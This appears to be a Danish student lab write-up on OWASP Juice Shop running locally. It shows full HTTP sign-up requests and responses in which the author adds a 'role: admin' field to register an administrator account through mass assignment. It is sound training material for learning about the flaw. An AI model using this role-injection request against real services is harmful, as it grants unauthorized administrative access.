# Spørgsmål 3 - Demonstration af Mass assignment


## Juice shop

!!! note "Gennemgang"

    1. Capture a sign up request
    1. Review the response in this request, and determine what attribute shows the users role
    1. Create a new request sign up request, with an extra parameter that sets the role as admin.

    Once you have done that, sign in to the juice page, and confirm that you can enter the admin page at the url: http://localhost:3000/#/administration You will probably need to authenticate

Jeg starter med at lave en ny bruger, med denne request.

???+ note "Opret bruger request"

    ```http linenums="0"
    POST /api/Users/ HTTP/1.1
    Host: localhost:3000
    Content-Length: 233
    sec-ch-ua-platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=gXWy6ZqWnJPaLzDVMr53wkbl7voAJlfprGY1jR8p6NemQXKg942BxOyEKr9q

    {
        "email":"test@test.com",
        "password":"Test!",
        "passwordRepeat":"Test!",
        "securityQuestion":{
            "id":11,
            "question":"Your favorite book?",
            "createdAt":"2025-11-03T10:25:07.377Z",
            "updatedAt":"2025-11-03T10:25:07.377Z"
        },
        "securityAnswer":"book"
    }
    ```

Her er dataen for den responce jeg modtager tilbage.

```json linenums="0"
{
    "status": "success",
    "data": {
        "username": "",
        "role": "customer",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/default.svg",
        "isActive": true,
        "id": 23,
        "email": "test@test.com",
        "updatedAt": "2025-11-03T13:18:43.806Z",
        "createdAt": "2025-11-03T13:18:43.806Z",
        "deletedAt": null
    }
}
```

Ved at kigge på den er der et enkelt attribut som hanger min interesse, og det er `role`. Jeg vil gerne prøve at sette dette attribut selv i den `POST` request man laver når man registrerer en ny bruger. Jeg laver derfor denne request med en lidt anden email og password:

??? note "set role request"

    ```http linenums="0"
    POST /api/Users/ HTTP/1.1
    Host: localhost:3000
    Content-Length: 233
    sec-ch-ua-platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=gXWy6ZqWnJPaLzDVMr53wkbl7voAJlfprGY1jR8p6NemQXKg942BxOyEKr9q

    {
        "email":"test2@test.com",
        "password":"Test2!",
        "passwordRepeat":"Test2!",
        "role": "admin",
        "securityQuestion":{
            "id":11,
            "question":"Your favorite book?",
            "createdAt":"2025-11-03T10:25:07.377Z",
            "updatedAt":"2025-11-03T10:25:07.377Z"
        },
        "securityAnswer":"book"
    }
    ```

Her har jeg tilføjet `"role": "admin",`, så servere forhåbenligt skulle grive denne bruger admin rettigheder. Jeg modtager ern `201 Created` tilbage, med dette message body:

```json linenums="0"
{
    "status": "success",
    "data": {
        "username": "",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
        "isActive": true,
        "id": 24,
        "email": "test2@test.com",
        "role": "admin",
        "updatedAt": "2025-11-03T13:23:55.550Z",
        "createdAt": "2025-11-03T13:23:55.550Z",
        "deletedAt": null
    }
}
```

Her ligner det at serveren har godtaget brugerens rolle som admin. Jeg vil teste det ved at åbne en admin side.

![alt text](image.png)

som det kan ses på billedet her har jeg åbnet siden, og jeg brugte den nye admin bruger. Juiceshop giver også achievements for at have gjordt det.